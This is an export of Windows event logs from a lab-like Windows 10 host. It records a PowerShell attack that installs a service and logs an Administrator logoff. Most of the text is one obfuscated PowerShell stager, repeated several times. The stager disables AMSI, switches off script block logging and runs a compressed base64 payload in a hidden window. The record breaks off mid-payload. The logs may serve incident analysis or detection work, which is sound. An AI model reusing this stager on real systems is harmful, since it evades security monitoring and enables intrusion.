$zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4556,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.176",f3kMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4557,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:42.734",e3kMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-out",authentication,4634,"Oct 23, 2022 @ 16:53:44.260","Oct 23, 2022 @ 16:53:43.556",event,success,"Microsoft-Windows-Security-Auditing",end,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was logged off.

Subject:
	Security ID:		S-1-5-21-504783269-3310020698-1149228630-500
	Account Name:		Administrator
	Account Domain:		CEO
	Logon ID:		0xDAC013

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.","-","-","-","-","-","-","-","-","-","-",Administrator,"-","-","-",CEO,"S-1-5-21-504783269-3310020698-1149228630-500",Administrator,Administrator,"-",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",3,"-","-","-","-","-","-","-","-","-","-","-","-","-","-",CEO,"-",0xdac013,"-","-","-","-",Administrator,"S-1-5-21-504783269-3310020698-1149228630-500","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4634,"Audit Success","-","-","-",0xdac013,Network,Info,656,748,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28786,Logoff,"-","-","-","-","-"
"Oct 23, 2022 @ 16:53:42.704",fXkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",7009,"Oct 23, 2022 @ 16:53:44.389","-",event,"-","Service Control Manager","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",error,"A timeout was reached (30000 milliseconds) while waiting for the czqMSHfNRVPgebzb service to connect.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,System,Ceo,"-","-",4600540058007A00710061006C0074000000,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",30000,"-","-","-","-",czqMSHfNRVPgebzb,"-","-","-","-","-","-","-","-","-","-",7009,Classic,"-","-","-","-","-","-",620,"7,228","{555908d1-a6d7-4695-8e1e-26931d2012f4}","Service Control Manager",3846,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:42.689",fHkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",7045,"Oct 23, 2022 @ 16:53:44.389","-",event,"-","Service Control Manager","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A service was installed in the system.

Service Name:  czqMSHfNRVPgebzb
Service File Name:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scG